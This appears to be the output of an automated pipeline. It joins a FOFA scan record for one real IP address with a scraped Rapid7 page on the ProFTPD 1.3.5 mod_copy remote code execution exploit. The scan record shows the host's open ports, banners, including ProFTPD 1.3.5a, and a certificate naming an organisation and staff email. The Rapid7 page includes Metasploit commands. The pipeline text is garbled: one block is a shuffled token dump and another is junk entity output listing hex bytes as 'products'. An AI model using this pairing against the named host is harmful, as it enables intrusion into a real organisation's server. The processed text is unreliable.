+https://fofa.so/api/v1/search/all?email=${YOUR_EMAIL}&key=${YOUR_KEY}&qbase64=aXA9Ijk1LjEyOC4xNDguMzAi
+API帮助
+您还可以参考SDK,下载https://github.com/FOFAPRO
+输入错误，请输入正确再查询
+收藏规则
+下载数据
+使用API
+×Close
+Download
+文件正在导出，可在个人中心的下载记录查询文件状态
+数据文件会保存10天,10天后文件可能会被清除,请尽快下载。
+×关闭
+网站正文
+关闭
+正在加载统计信息......
+搜索 ip="95.128.148.30" 获得 12 条匹配结果 (独立IP数为
+条)， 用时 30 毫秒，模式: extended。
+默认只显示一年内的数据，点击 all 链接查看所有。
+← 上一页 1 2 下一页 →
+95.128.148.30
+22
+ssh
+95.128.148.30
+2019-07-02
+France
+/
+Rezé
+ASN:
+42845
+组织:
+Bretagne Telecom SAS
+SSH-2.0-OpenSSH_7.4
+95.128.148.30
+80
+Accueil: EEQ Eurocell Diagnostics
+95.128.148.30
+2019-07-01
+France
+/
+Rezé
+ASN:
+42845
+组织:
+Bretagne Telecom SAS
+Apache/2.4.9 (Win64) PHP/5.5.12
+HTTP/1.1 200 OK
+Connection: close
+Content-Length: 7202
+Cache-Control: private
+Content-Type: text/html; charset=utf-8
+Date: Sun, 30 Jun 2019 17:06:23 GMT
+Server: Apache/2.4.9 (Win64) PHP/5.5.12
+X-Powered-By: PHP/5.5.12
+95.128.148.30
+80
+http
+95.128.148.30
+2019-07-01
+France
+/
+Rezé
+ASN:
+42845
+组织:
+Bretagne Telecom SAS
+HTTP/1.1 307 Temporary Redirect
+Date: Sun, 30 Jun 2019 17:06:17 GMT
+Server: Apache/2.4.9 (Win64) PHP/5.5.12
+X-Powered-By: PHP/5.5.12
+Location: http://95.128.148.30:80/accueil/
+Content-Length: 0
+Content-Type: text/html
+95.128.148.30
+444
+https
+95.128.148.30
+2019-06-29
+France
+/
+Rezé
+ASN:
+42845
+组织:
+Bretagne Telecom SAS
+HTTP/1.1 301 Moved Permanently
+Date: Sat, 29 Jun 2019 01:39:15 GMT
+Server: Apache
+Strict-Transport-Security: max-age=300; includeSubDomains; preload
+Status: 301 Moved Permanently
+Location: https://www.intraknow.com
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8Version:
+v1
+Serial Number: 12199484443532074104
+Signature Algorithm: SHA1-RSA (self-signed)
+Issuer:
+Country: FR
+Province: Bretagne
+Locality: Rennes
+Organization: Eurocell
+Organizational Unit: Intraknow
+CommonName: VM-04-EUROCELL
+Email Address: supervision-infra@yieloo.com
+Validity:
+Not Before: 2017-04-14 10:01 UTC
+Not After : 2027-04-12 10:01 UTC
+Subject:
+Country: FR
+Province: Bretagne
+Locality: Rennes
+Organization: Eurocell
+Organizational Unit: Intraknow
+CommonName: VM-04-EUROCELL
+Email Address: supervision-infra@yieloo.com
+Subject Public Key Info:
+Public Key Algorithm: RSA
+Public Key:
+Exponent: 65537
+Public Key Modulus: (4096 bits) :
+D5:7E:89:91:2C:DB:C9:A6:5E:99:EF:57:32:DC:F8:39:
+B8:E7:F6:DC:32:E8:B1:F2:30:46:32:42:22:D7:01:C1:
+E4:A6:33:8F:BD:71:D8:D6:F1:A9:17:B3:A3:83:DF:17:
+0B:19:CF:34:B3:84:15:03:D6:BA:3F:3D:91:25:00:BD:
+E1:9C:F6:41:49:6D:70:7A:95:F3:D5:4F:A4:7D:F0:3D:
+9E:5A:18:7D:9A:85:21:7E:30:7C:77:DB:23:6E:38:BC:
+F3:55:15:61:1C:BE:38:50:E8:B1:FD:9A:A5:EF:38:AD:
+94:31:84:8B:DF:2F:84:FD:BB:63:50:25:16:D0:24:14:
+D9:23:F3:97:0E:F0:44:76:53:29:8D:07:09:00:4C:E0:
+05:A0:F1:C4:AD:C6:5F:D5:DD:6E:09:B0:3A:C0:0F:73:
+6C:9C:FA:D7:CB:5B:88:E4:1B:A6:E3:B3:EC:F4:59:0B:
+BD:E7:9C:7C:BA:36:2A:E4:20:40:4F:06:79:A5:33:05:
+34:B6:46:84:73:DD:43:33:99:B5:4F:0D:14:A7:5D:B2:
+04:27:14:3D:A4:8F:4F:E6:FC:DC:38:B5:68:73:23:14:
+73:0A:2B:48:5D:93:F9:E0:D4:E8:45:14:B5:2F:DA:5A:
+3C:78:71:C5:54:57:87:27:C4:10:44:62:B4:A8:1F:25:
+C2:97:BB:6A:17:95:73:5E:F5:0F:50:1C:25:79:88:77:
+8A:2B:B4:87:0F:D3:C2:D7:5A:85:0E:2D:40:1F:74:27:
+68:53:3B:50:A2:7B:D9:8F:60:3F:4F:6B:8E:45:D2:7A:
+F4:DC:21:09:CF:F4:26:BE:81:24:DC:7B:D7:BB:17:EF:
+17:00:33:64:11:1E:44:7A:DB:79:93:6B:ED:35:D0:62:
+5B:C6:6F:84:F6:01:F3:B4:4A:79:05:51:9B:85:0F:2F:
+52:3F:8B:AF:83:AB:6A:BB:02:DA:9E:FF:31:B3:E8:AE:
+CF:91:C7:26:EE:27:1C:12:9F:B1:23:24:FA:C5:EF:F3:
+37:8C:76:54:D7:3C:0B:B6:FC:38:D9:DE:84:33:DB:2A:
+88:E3:B8:E0:51:E6:69:BA:81:1E:9F:8F:D5:BE:E8:DA:
+8E:DB:D6:B1:B0:C9:92:DF:4E:FE:30:D9:60:CD:58:2E:
+A3:6C:C2:4F:00:9C:6E:C1:1C:86:DC:D5:F7:AD:A1:E0:
+C9:1C:8B:43:28:E9:83:8A:36:1A:33:34:2E:85:15:F5:
+7C:48:00:AF:5E:AC:76:5C:FF:DF:41:5D:EE:58:38:71:
+90:CB:82:D7:E2:57:B0:AD:0B:49:13:C0:70:60:9A:0C:
+7F:2F:0B:C2:12:56:B7:40:9F:EF:F6:DE:E0:F0:07:B3
+Certificate Signature Algorithm: SHA1-RSA
+Certificate Signature:
+5A:DC:7A:BD:56:0F:A7:26:F6:80:DB:11:1A:84:D5:31:
+72:62:83:33:25:C0:A3:42:5E:D0:D9:F6:8C:D0:49:F5:
+4F:AD:02:A1:90:82:66:BC:EE:F0:61:07:55:26:86:C3:
+2E:8C:AD:3D:69:DC:25:96:3B:13:69:9A:B8:7A:B8:B8:
+BA:27:E9:CF:18:C9:BC:FA:59:EE:4F:86:E5:D8:0E:EC:
+4F:66:9C:8A:D9:4C:89:9D:12:CE:66:65:53:58:42:A6:
+3B:0A:16:4C:23:BD:C8:18:CA:FC:91:40:01:FA:CD:71:
+4A:1E:3E:ED:D3:34:29:80:4D:92:73:DB:81:47:16:7E:
+FA:15:C7:D6:AD:83:BF:BB:52:13:98:65:E9:71:12:4E:
+BE:E7:62:99:0C:48:62:CC:79:BD:31:08:DA:D1:32:6D:
+8F:86:B0:D2:A6:8F:79:DF:4F:35:57:3E:BC:C0:6A:84:
+D3:BC:8E:CA:F0:03:26:F6:48:E5:4F:AD:21:7A:7E:7C:
+89:91:BF:15:13:A2:97:F7:44:62:54:0E:B4:17:7F:16:
+96:13:14:8B:8B:7F:1F:AC:B1:36:20:09:C6:CA:68:FE:
+57:D8:4C:BA:12:B6:F1:1B:DC:13:09:2F:69:F9:D2:D5:
+6A:25:03:E9:57:DB:F9:8E:9C:74:4B:85:90:9E:C5:BE:
+85:1E:A8:2F:ED:0D:33:94:AD:E5:16:F1:A2:DF:86:47:
+9A:FB:A6:F9:CB:E5:13:D1:87:F8:89:E0:0E:B4:B7:84:
+9B:2B:F7:44:40:85:64:36:B2:F8:04:02:34:40:ED:E7:
+A7:85:1A:6D:F9:7A:EE:2F:F6:68:28:62:08:3C:7B:CE:
+A8:E9:96:D8:6A:33:A3:00:9E:CD:B0:4C:51:E7:3A:76:
+26:03:C3:D9:E1:EB:05:E4:92:E8:63:2B:90:B4:90:A2:
+55:E7:45:F9:9C:0A:FA:A9:43:3F:D9:EF:8C:4D:EF:E8:
+3F:E6:37:02:77:DB:CD:10:1C:1B:FB:BD:E3:BF:7B:88:
+1E:34:DA:D7:D0:EF:9E:30:0B:57:6B:62:C2:E8:C3:99:
+04:DD:9C:9A:5A:FE:93:28:1D:8D:C9:A9:8E:3F:09:39:
+4D:5A:B4:C9:8A:97:4B:1C:A6:12:63:39:A6:4B:0B:F8:
+2D:6E:9B:B1:49:9E:4F:89:29:31:70:2C:B4:05:3F:47:
+10:03:52:9B:36:58:C7:1E:86:71:29:3D:2C:3F:A2:F5:
+5B:A9:FD:A5:57:9B:A6:17:42:4B:BF:D9:8B:38:F9:6E:
+20:87:16:16:79:2C:2E:50:92:74:C8:30:F2:27:8F:20:
+DE:2B:FA:D0:65:46:05:C1:35:2F:1C:7F:79:B7:72:06
+95.128.148.30
+21
+ftp
+95.128.148.30
+2019-06-29
+France
+/
+Rezé
+ASN:
+42845
+组织:
+Bretagne Telecom SAS
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+95.128.148.30:444
+444
+400 Bad Request
+95.128.148.30
+2019-06-25
+France
+/
+Rezé
+ASN:
+42845
+组织:
+Bretagne Telecom SAS
+Apache
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 362
+Content-Type: text/html; charset=iso-8859-1
+Date: Tue, 25 Jun 2019 11:31:13 GMT
+Server: Apache
+Strict-Transport-Security: max-age=300; includeSubDomains; preload
+95.128.148.30:8080
+8080
+Accueil: EEQ Eurocell Diagnostics
+95.128.148.30
+2019-06-21
+France
+/
+Rezé
+ASN:
+42845
+组织:
+Bretagne Telecom SAS
+Apache/2.4.9 (Win64) PHP/5.5.12
+HTTP/1.1 200 OK
+Connection: close
+Content-Length: 7212
+Cache-Control: private
+Content-Type: text/html; charset=utf-8
+Date: Fri, 21 Jun 2019 14:17:26 GMT
+Server: Apache/2.4.9 (Win64) PHP/5.5.12
+X-Powered-By: PHP/5.5.12
+95.128.148.30
+8080
+http
+95.128.148.30
+2019-06-21
+France
+/
+Rezé
+ASN:
+42845
+组织:
+Bretagne Telecom SAS
+HTTP/1.1 307 Temporary Redirect
+Date: Fri, 21 Jun 2019 12:41:14 GMT
+Server: Apache/2.4.9 (Win64) PHP/5.5.12
+X-Powered-By: PHP/5.5.12
+Location: http://95.128.148.30:8080/accueil/
+Content-Length: 0
+Content-Type: text/html
+https://95.128.148.30:444
+444
+95.128.148.30
+2019-06-19
+France
+/
+Rezé
+ASN:
+42845
+组织:
+Bretagne Telecom SAS
+Apache
+HTTP/1.0 404 Not Found
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Date: Tue, 18 Jun 2019 18:21:42 GMT
+Server: Apache
+Strict-Transport-Security: max-age=300; includeSubDomains; preload
+Content-Length: 0
+Version:
+v1
+Serial Number: 12199484443532074104
+Signature Algorithm: SHA1-RSA (self-signed)
+Issuer:
+Country: FR
+Province: Bretagne
+Locality: Rennes
+Organization: Eurocell
+Organizational Unit: Intraknow
+CommonName: VM-04-EUROCELL
+Email Address: supervision-infra@yieloo.com
+Validity:
+Not Before: 2017-04-14 10:01 UTC
+Not After : 2027-04-12 10:01 UTC
+Subject:
+Country: FR
+Province: Bretagne
+Locality: Rennes
+Organization: Eurocell
+Organizational Unit: Intraknow
+CommonName: VM-04-EUROCELL
+Email Address: supervision-infra@yieloo.com
+Subject Public Key Info:
+Public Key Algorithm: RSA
+Public Key:
+Exponent: 65537
+Public Key Modulus: (4096 bits) :
+D5:7E:89:91:2C:DB:C9:A6:5E:99:EF:57:32:DC:F8:39:
+B8:E7:F6:DC:32:E8:B1:F2:30:46:32:42:22:D7:01:C1:
+E4:A6:33:8F:BD:71:D8:D6:F1:A9:17:B3:A3:83:DF:17:
+0B:19:CF:34:B3:84:15:03:D6:BA:3F:3D:91:25:00:BD:
+E1:9C:F6:41:49:6D:70:7A:95:F3:D5:4F:A4:7D:F0:3D:
+9E:5A:18:7D:9A:85:21:7E:30:7C:77:DB:23:6E:38:BC:
+F3:55:15:61:1C:BE:38:50:E8:B1:FD:9A:A5:EF:38:AD:
+94:31:84:8B:DF:2F:84:FD:BB:63:50:25:16:D0:24:14:
+D9:23:F3:97:0E:F0:44:76:53:29:8D:07:09:00:4C:E0:
+05:A0:F1:C4:AD:C6:5F:D5:DD:6E:09:B0:3A:C0:0F:73:
+6C:9C:FA:D7:CB:5B:88:E4:1B:A6:E3:B3:EC:F4:59:0B:
+BD:E7:9C:7C:BA:36:2A:E4:20:40:4F:06:79:A5:33:05:
+34:B6:46:84:73:DD:43:33:99:B5:4F:0D:14:A7:5D:B2:
+04:27:14:3D:A4:8F:4F:E6:FC:DC:38:B5:68:73:23:14:
+73:0A:2B:48:5D:93:F9:E0:D4:E8:45:14:B5:2F:DA:5A:
+3C:78:71:C5:54:57:87:27:C4:10:44:62:B4:A8:1F:25:
+C2:97:BB:6A:17:95:73:5E:F5:0F:50:1C:25:79:88:77:
+8A:2B:B4:87:0F:D3:C2:D7:5A:85:0E:2D:40:1F:74:27:
+68:53:3B:50:A2:7B:D9:8F:60:3F:4F:6B:8E:45:D2:7A:
+F4:DC:21:09:CF:F4:26:BE:81:24:DC:7B:D7:BB:17:EF:
+17:00:33:64:11:1E:44:7A:DB:79:93:6B:ED:35:D0:62:
+5B:C6:6F:84:F6:01:F3:B4:4A:79:05:51:9B:85:0F:2F:
+52:3F:8B:AF:83:AB:6A:BB:02:DA:9E:FF:31:B3:E8:AE:
+CF:91:C7:26:EE:27:1C:12:9F:B1:23:24:FA:C5:EF:F3:
+37:8C:76:54:D7:3C:0B:B6:FC:38:D9:DE:84:33:DB:2A:
+88:E3:B8:E0:51:E6:69:BA:81:1E:9F:8F:D5:BE:E8:DA:
+8E:DB:D6:B1:B0:C9:92:DF:4E:FE:30:D9:60:CD:58:2E:
+A3:6C:C2:4F:00:9C:6E:C1:1C:86:DC:D5:F7:AD:A1:E0:
+C9:1C:8B:43:28:E9:83:8A:36:1A:33:34:2E:85:15:F5:
+7C:48:00:AF:5E:AC:76:5C:FF:DF:41:5D:EE:58:38:71:
+90:CB:82:D7:E2:57:B0:AD:0B:49:13:C0:70:60:9A:0C:
+7F:2F:0B:C2:12:56:B7:40:9F:EF:F6:DE:E0:F0:07:B3
+Certificate Signature Algorithm: SHA1-RSA
+Certificate Signature:
+5A:DC:7A:BD:56:0F:A7:26:F6:80:DB:11:1A:84:D5:31:
+72:62:83:33:25:C0:A3:42:5E:D0:D9:F6:8C:D0:49:F5:
+4F:AD:02:A1:90:82:66:BC:EE:F0:61:07:55:26:86:C3:
+2E:8C:AD:3D:69:DC:25:96:3B:13:69:9A:B8:7A:B8:B8:
+BA:27:E9:CF:18:C9:BC:FA:59:EE:4F:86:E5:D8:0E:EC:
+4F:66:9C:8A:D9:4C:89:9D:12:CE:66:65:53:58:42:A6:
+3B:0A:16:4C:23:BD:C8:18:CA:FC:91:40:01:FA:CD:71:
+4A:1E:3E:ED:D3:34:29:80:4D:92:73:DB:81:47:16:7E:
+FA:15:C7:D6:AD:83:BF:BB:52:13:98:65:E9:71:12:4E:
+BE:E7:62:99:0C:48:62:CC:79:BD:31:08:DA:D1:32:6D:
+8F:86:B0:D2:A6:8F:79:DF:4F:35:57:3E:BC:C0:6A:84:
+D3:BC:8E:CA:F0:03:26:F6:48:E5:4F:AD:21:7A:7E:7C:
+89:91:BF:15:13:A2:97:F7:44:62:54:0E:B4:17:7F:16:
+96:13:14:8B:8B:7F:1F:AC:B1:36:20:09:C6:CA:68:FE:
+57:D8:4C:BA:12:B6:F1:1B:DC:13:09:2F:69:F9:D2:D5:
+6A:25:03:E9:57:DB:F9:8E:9C:74:4B:85:90:9E:C5:BE:
+85:1E:A8:2F:ED:0D:33:94:AD:E5:16:F1:A2:DF:86:47:
+9A:FB:A6:F9:CB:E5:13:D1:87:F8:89:E0:0E:B4:B7:84:
+9B:2B:F7:44:40:85:64:36:B2:F8:04:02:34:40:ED:E7:
+A7:85:1A:6D:F9:7A:EE:2F:F6:68:28:62:08:3C:7B:CE:
+A8:E9:96:D8:6A:33:A3:00:9E:CD:B0:4C:51:E7:3A:76:
+26:03:C3:D9:E1:EB:05:E4:92:E8:63:2B:90:B4:90:A2:
+55:E7:45:F9:9C:0A:FA:A9:43:3F:D9:EF:8C:4D:EF:E8:
+3F:E6:37:02:77:DB:CD:10:1C:1B:FB:BD:E3:BF:7B:88:
+1E:34:DA:D7:D0:EF:9E:30:0B:57:6B:62:C2:E8:C3:99:
+04:DD:9C:9A:5A:FE:93:28:1D:8D:C9:A9:8E:3F:09:39:
+4D:5A:B4:C9:8A:97:4B:1C:A6:12:63:39:A6:4B:0B:F8:
+2D:6E:9B:B1:49:9E:4F:89:29:31:70:2C:B4:05:3F:47:
+10:03:52:9B:36:58:C7:1E:86:71:29:3D:2C:3F:A2:F5:
+5B:A9:FD:A5:57:9B:A6:17:42:4B:BF:D9:8B:38:F9:6E:
+20:87:16:16:79:2C:2E:50:92:74:C8:30:F2:27:8F:20:
+DE:2B:FA:D0:65:46:05:C1:35:2F:1C:7F:79:B7:72:06
+95.128.148.30
+20
+ftp
+95.128.148.30
+2019-04-14
+France
+/
+Rezé
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+← 上一页 1 2 下一页 →
+下载所有图片
+正在加载图标信息......
+×Close
+升级到普通会员以上级别用户就可以使用API了。
+https://fofa.so/api/v1/search/all?email=${YOUR_EMAIL}&key=${YOUR_KEY}&qbase64=aXA9Ijk1LjEyOC4xNDguMzAi
+API帮助
+您还可以参考SDK,下载https://github.com/FOFAPRO
+白帽汇
+服务热线：400-650-2031
+联系邮箱：service@baimaohui.net
+地址：北京市朝阳区东三环北路天元港B座10层
+产品
+企业版>
+NOSEC
+FOEYE
+BCSEC
+信息
+关于我们
+帮助文档
+English
+&nbsp &nbsp 简体中文
+zh-CN
+版权所有 © 白帽汇 2015 - 2019. All Rights Reserved 粤ICP备16088626号. Version 3.4.273
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://fofa.so/result?qbase64=aXA9Ijk1LjEyOC4xNDguMzAi===============================
+
+ ← 上一页 1 2 下一页 → 下载所有图片 正在加载图标信息 ...... × close 升级到普通会员以上级别用户就可以使用api了 。 https :// fofa fofapro 输入错误 ， 请输入正确再查询 收藏规则 下载数据 使用api × close download 文件正在导出 ， 可在个人中心的下载记录查询文件状态 数据文件会保存10天 请尽快下载 。 × 关闭 网站正文 关闭 正在加载统计信息 ...... 搜索 ip =" 95 链接查看所有 。 ← 上一页 1 2 下一页 → 95 1积分 登录与注册 × close 升级到普通会员以上级别用户就可以使用api了 。 https :// fofa email =${ your_email }& key =${ your_key }& qbase64 sdk 规则列表 fofa客户端 vip会员 切换导航 规则列表 规则专题 企业版 api 独立ip数为 条 )， 用时 30 毫秒 ， 模式 搜索结果 问题反馈 问题反馈关闭 请详细描述您要反馈的内容 请留下您的手机号或邮箱 ， 方便我们与您联系 nosec foeye bcsec 信息 关于我们 帮助文档 english bretagne telecom sas 220 nasftpd turbo station 1 rezé 220 nasftpd turbo station 1 net 地址 ： 北京市朝阳区东三环北路天元港b座10层 产品 企业版 extended 。 默认只显示一年内的数据 ， 点击 fofapro 白帽汇 服务热线 ： 400 444 444 400 bad request 95 1 400 bad request connection cn 版权所有 © 白帽汇 2015 1 307 temporary redirect date 1 301 moved permanently date bretagne telecom sas apache http com subject public key info html https :// 95 30 444 https 95 验证码 提交 规则专题 api bretagne telecom sas ssh bretagne telecom sas http bretagne telecom sas apache 1 200 ok connection 2031 联系邮箱 ： service 65537 public key modulus https :// www 301 moved permanently location eeq eurocell diagnostics 95 sdk 客户端 vip会员 30 21 ftp 95 30 22 ssh 95 30 20 ftp 95 30 8080 http 95 30 80 http 95 http :// 95 30 jun 2019 17 18 jun 2019 18 444 444 95 21 jun 2019 14 b3 certificate signature algorithm 21 jun 2019 12 eurocell email address 下载https :// github 25 jun 2019 11 29 jun 2019 01 close content public key algorithm fofa pro rsa public key 12199484443532074104 signature algorithm 1 date eurocell organizational unit rsa certificate signature rights reserved 粤icp备16088626号 axa9ijk1ljeyoc4xndgumzai api帮助 您还可以参考sdk 01 utc subject 30 80 accueil 2 17 gmt server 14 gmt server 获得 12 条匹配结果 v1 serial number nbsp 简体中文 zh 42 gmt server 26 gmt server 23 gmt server 15 gmt server 13 gmt server 8080 8080 accueil 30 2019 bretagne locality html 95 12 95 1 rezé asn preload 95 12 http 8 date 4 95 06 95 found connection 12 location 0 connection apache strict 21 france 01 utc api com validity 14 france 01 france 5a server com content 29 france 25 france 12 x 14 10 rennes organization preload status fr province 95 7212 cache 7202 cache 42845 组织 4096 bits 12 10 private content preload content 362 content 30 0 version 0 404 0 content version 3 intraknow commonname 19 france 02 france 2019 apache 21 18 8080 80 17 com b3 22 20 11 14 01 rsa html accueil 29 25 12 v1 nbsp 42 26 23 15 13 content 0 10 intraknow 5a 4 3 19 06 02 选填 yieloo win64 vm utf type tue transport text supervision sun signed sha1 self security search sat proftpd powered php openssh_7 max length issuer iso infra includesubdomains fri ff fe fd fc fb fa f9 f8 f7 f6 f5 f4 f3 f2 f1 f0 exponent ef ee ed ec eb e9 e8 e7 e6 e5 e4 e3 e2 e1 e0 df de dd dc db da d9 d8 d7 d6 d5 d4 d3 d2 d1 d0 country control charset cf ce cd cc cb ca c9 c8 c7 c6 c5 c4 c3 c2 c1 c0 bf bd bc bb baimaohui ba b8 b7 b6 b5 b4 b2 b1 b0 age af ae ad ac ab a9 a8 a7 a6 a5 a4 a3 a2 a1 a0 9f 9e 9d 9c 9b 9a 99 98 97 96 94 93 92 91 90 9 8version 8f 8e 8d 8c 8b 8a 89 8859 88 87 86 85 84 83 82 81 7f 7e 7d 7c 7b 7a 79 78 77 76 74 73 72 71 70 6f 6e 6d 6c 6b 6a 69 68 66 650 65 64 63 62 61 60 5f 5e 5d 5c 5b 59 58 57 56 55 54 53 52 51 50 5 4f 4e 4d 4c 4b 4a 49 48 47 46 45 44 43 41 40 3f 3e 3d 3c 3b 3a 39 38 37 36 35 34 33 32 31 300 2f 2e 2d 2c 2b 2a 28 273 27 24 2027 2017 1f 1e 1d 1c 1b 1a 16 148 128 10天后文件可能会被清除 0f 0e 0d 0c 0b 0a 09 08 07 05 04 03 00
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [],
+  "device_types": [],
+  "products": [
+    "qbase64",
+    "axa9ijk1ljeyoc4xndgumzai",
+    "qbase64",
+    "b3",
+    "axa9ijk1ljeyoc4xndgumzai",
+    "v1",
+    "win64",
+    "sha1",
+    "f9",
+    "f8",
+    "f7",
+    "f6",
+    "f5",
+    "f4",
+    "f3",
+    "f2",
+    "f1",
+    "f0",
+    "e9",
+    "e8",
+    "e7",
+    "e6",
+    "e5",
+    "e4",
+    "e3",
+    "e2",
+    "e1",
+    "e0",
+    "d9",
+    "d8",
+    "d7",
+    "d6",
+    "d5",
+    "d4",
+    "d3",
+    "d2",
+    "d1",
+    "d0",
+    "c9",
+    "c8",
+    "c7",
+    "c6",
+    "c5",
+    "c4",
+    "c3",
+    "c2",
+    "c1",
+    "c0",
+    "b8",
+    "b7",
+    "b6",
+    "b5",
+    "b4",
+    "b2",
+    "b1",
+    "b0",
+    "a9",
+    "a8",
+    "a7",
+    "a6",
+    "a5",
+    "a4",
+    "a3",
+    "a2",
+    "a1",
+    "a0"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec===============================
+
+ProFTPD 1.3.5 Mod_Copy Command Execution | Rapid7
+Quick Cookie Notification
+This site uses cookies, including for analytics, personalization, and advertising purposes.
+For more information or to change your cookie settings, click here.
+If you continue to browse this site without changing your cookie settings, you agree to this use.
+I AGREE, LET’S GO!
+View Cookie Policy for full details
+Main Menu
+Products
+InsightIDR
+User Behavior Analytics & SIEM
+InsightVM
+Vulnerability Management
+InsightAppSec
+Dynamic Application Security Testing
+InsightConnect
+Orchestration & Automation
+InsightOps
+Log Management
+Metasploit
+Penetration Testing
+AppSpider
+Application Security On-Premise
+tCell by Rapid7
+Application Monitoring & Protection
+Services
+Managed Services
+Managed Detection & Response (MDR)
+Managed Vulnerability Management
+Managed Application Security
+Consulting Services
+Advisory Services
+Incident Response Services
+Penetration Testing Services
+IoT Security Services
+Training & Certification
+Partners
+Sales Partners
+Technology Partners
+Find a Partner
+Research
+Blog
+Docs
+Support
+Free Trial
+Helpful Links
+Product Support
+Product Pricing
+Resource Library
+Events & Webcasts
+Training & Certification
+News & Press Releases
+About Rapid7
+Products
+The Rapid7 Insight Cloud
+Rapid7 Insight is your home for SecOps, equipping you with the visibility, analytics, and automation you need to unite your teams and amplify efficiency.
+Insight Cloud OverviewInsight Cloud Pricing Try Now
+Insight Products
+InsightIDR
+User Behavior Analytics & SIEM
+Free Trial
+InsightVM
+Vulnerability Management
+Free Trial
+InsightAppSec
+Dynamic Application Security Testing
+Free Trial
+InsightConnect
+Orchestration & Automation
+Request Demo
+InsightOps
+Log Management
+Free Trial
+Metasploit
+Penetration Testing
+Free Trial
+AppSpider
+Application Security On-Premise
+Free Trial
+tCell by Rapid7
+Application Monitoring & Protection
+Request Demo
+View All Products
+&vert;   Search by Solution
+Helpful Links
+Product Support
+Product Pricing
+Resource Library
+Events & Webcasts
+Training & Certification
+News & Press Releases
+About Rapid7
+Services
+Rapid7 Global Services
+Need a hand with your security program? From planning and strategy to full service support, our experts have you covered.
+Incident Response
+Need immediate help with a breach?
++1-844-RAPID-IR
+Managed Services
+Managed Detection & Response (MDR)
+Managed Vulnerability Management
+Managed Application Security
+Consulting Services
+Advisory Services
+Incident Response Services
+Penetration Testing Services
+IoT Security Services
+Training & Certification
+View All Services
+Helpful Links
+Product Support
+Product Pricing
+Resource Library
+Events & Webcasts
+Training & Certification
+News & Press Releases
+About Rapid7
+Partners
+Sales Partners
+Technology Partners
+Find a Partner
+Research
+Home
+Vulnerability & Exploit Database
+Modules
+en
+English
+Deutsch
+日本語
+Blog
+Docs
+Support
+Sign In
+Free Trial
+Rapid7 Vulnerability & Exploit Database
+ProFTPD 1.3.5 Mod_Copy Command Execution
+Back to Search
+ProFTPD 1.3.5 Mod_Copy Command Execution
+Disclosed
+04/22/2015
+Created
+05/30/2018
+Description
+This module exploits the SITE CPFR/CPTO commands in ProFTPD version 1.3.5.
+Any unauthenticated client can leverage these commands to copy files from any
+part of the filesystem to a chosen destination. The copy commands are executed with
+the rights of the ProFTPD service, which by default runs under the privileges of the
+'nobody' user. By using /proc/self/cmdline to copy a PHP payload to the website
+directory, PHP remote code execution is made possible.
+Author(s)
+Vadim Melihow
+xistence <xistence@0x90.nl>
+Platform
+Unix
+Architectures
+cmd
+Development
+Source Code
+History
+References
+CVE-2015-3306
+EDB-36742
+Module Options
+To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced':
+msf > use exploit/unix/ftp/proftpd_modcopy_exec
+msf exploit(proftpd_modcopy_exec) > show targets
+...targets...
+msf exploit(proftpd_modcopy_exec) > set TARGET < target-id >
+msf exploit(proftpd_modcopy_exec) > show options
+...show and set options...
+msf exploit(proftpd_modcopy_exec) > exploit
+Penetration testing software for offensive security teams.
+Key Features
+Collect and share all the information you need to conduct a successful and efficient penetration test
+Simulate complex attacks against your systems and users
+Test your defenses to make sure they’re ready
+Automate Every Step of Your Penetration Test
+Free Metasploit Pro Trial
+View All Features
+Time is precious, so I don’t want to do something manually that I can automate. Leveraging the Metasploit Framework when automating any task keeps us from having to re-create the wheel as we can use the existing libraries and focus our efforts where it matters.
+– Jim O’Gorman | President, Offensive Security
+;
+BACK TO TOP
+CUSTOMER SUPPORT
++1-866-390-8113 (Toll Free)
+SALES SUPPORT
++1-866-7RAPID7 (Toll Free)
+Need immediate help with a breach?
++1-844-RAPID-IR
+SOLUTIONS
+All Solutions
+Industry Solutions
+Compliance Solutions
+SUPPORT & RESOURCES
+Product Support
+Resource Library
+Customer Stories
+Events & Webcasts
+Training & Certification
+IT & Security Fundamentals
+Vulnerability & Exploit Database
+ABOUT US
+Company
+Leadership
+News & Press Releases
+Customers
+Public Policy
+Investors
+CONNECT WITH US
+Contact
+Blog
+Support Login
+Careers
+© Rapid7
+Legal Terms
+|
+Privacy Policy
+|
+Export Notice
+|
+Trust
+Chat
+Contact Us
+Success! Thank you for submission. We will be in touch shortly.
+Oops! There was a problem in submission. Please contact us.
+Contact Us
+We're happy to answer any questions you may have about Rapid7
+Reason for Contact
+General
+Demo Request
+Pricing
+Professional Services
+Request for Proposal
+Select Product
+Metasploit
+InsightIDR
+InsightVM
+InsightOps
+InsightAppSec
+AppSpider
+Nexpose
+First Name
+Last Name
+Job Title
+Company
+Email Address
+Phone
+Country
+State
+I do not want to receive emails regarding Rapid7's products and services.
+Please refer to our Privacy Policy or contact us at info@rapid7.com for more details
+I am a consultant, partner, or reseller.
+Submit
+General:
+info@rapid7.com
+Sales:
++1–866–7–Rapid7
+sales@rapid7.com
+Support:
++1–866–390–8113(toll free)
+support@rapid7.com
+Incident Response:
+1-844-RAPID-IR
+More Contact Info
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec===============================
+
